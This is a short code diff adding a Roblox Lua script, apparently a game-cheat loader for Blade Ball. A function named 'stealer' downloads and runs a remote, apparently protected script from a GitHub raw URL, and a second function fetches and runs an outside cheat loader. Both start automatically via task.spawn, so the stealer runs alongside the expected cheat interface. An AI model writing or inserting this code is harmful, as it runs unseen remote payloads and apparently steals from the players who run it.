@@ -1,0 +1,10 @@
+local function stealer()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ilnoob09pollo-afk/Blade-ball/refs/heads/main/Protected_4766445581309054.lua.txt"))()
+end
+
+local function loadui()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/H4xScripts/Loader/refs/heads/main/loader.lua", true))()
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
